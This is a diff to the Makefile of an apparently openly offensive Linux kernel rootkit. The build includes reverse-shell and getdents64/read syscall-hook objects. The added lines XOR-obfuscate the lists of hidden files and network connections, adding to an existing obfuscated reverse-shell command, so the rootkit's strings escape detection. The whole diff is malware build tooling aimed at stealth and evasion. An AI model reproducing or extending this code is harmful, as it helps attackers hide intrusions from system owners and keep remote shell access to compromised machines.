@@ -14,6 +14,31 @@ XOR_KEY := 0x5A
 RSHELL_HOST ?=
 RSHELL_PORT ?=
 
+
+# xor STRING_EXCLUDES
+STRING_EXCLUDES_OBF := $(shell \
+  STRING_EXCLUDES_STR="$(STRING_EXCLUDES)"; \
+  i=1; \
+  while [ $$i -le $$(printf '%s' "$$STRING_EXCLUDES_STR" | wc -c) ]; do \
+    c=$$(printf '%s' "$$STRING_EXCLUDES_STR" | cut -b$$i); \
+    printf "'\\x%02x', " $$(( $$(printf '%d' "'$$c") ^ $(XOR_KEY) )); \
+    i=$$((i + 1)); \
+  done; \
+  echo "'\\x00'"; \
+)
+
+# xor NET_EXCLUDES
+NET_EXCLUDES_OBF := $(shell \
+  NET_EXCLUDES_STR="$(NET_EXCLUDES)"; \
+  i=1; \
+  while [ $$i -le $$(printf '%s' "$$NET_EXCLUDES_STR" | wc -c) ]; do \
+    c=$$(printf '%s' "$$NET_EXCLUDES_STR" | cut -b$$i); \
+    printf "'\\x%02x', " $$(( $$(printf '%d' "'$$c") ^ $(XOR_KEY) )); \
+    i=$$((i + 1)); \
+  done; \
+  echo "'\\x00'"; \
+)
+
 # no need to define RSHELL_CMD if rshell host / port are empty
 ifneq ($(strip $(RSHELL_HOST)),)
   ifneq ($(strip $(RSHELL_PORT)),)
@@ -43,6 +68,7 @@ $(MODULE_NAME)-objs := src/mod_rootkit.o \
                        src/tasks/reverse_shell.o \
                        src/hooks/x64_sys_getdents64.o \
                        src/hooks/x64_sys_read.o \
+                       src/utils/encrypt_utils.o \
                        src/utils/ftrace_utils.o \
                        src/utils/kprobes_utils.o \
                        src/utils/proc_utils.o \
@@ -51,8 +77,8 @@ $(MODULE_NAME)-objs := src/mod_rootkit.o \
 
 EXTRA_CFLAGS += -I$(PWD)/include \
                 -DMODULE_NAME=\"$(MODULE_NAME)\" \
-                -DSTRING_EXCLUDES=\"$(STRING_EXCLUDES)\" \
-                -DNET_EXCLUDES=\"$(NET_EXCLUDES)\" \
+                -DSTRING_EXCLUDES="{ $(STRING_EXCLUDES_OBF) }" \
+                -DNET_EXCLUDES="{ $(NET_EXCLUDES_OBF) }" \
 				-DRSHELL_CMD_OBF="{ $(RSHELL_CMD_OBF) }" \
 				-DXOR_KEY=$(XOR_KEY)
 
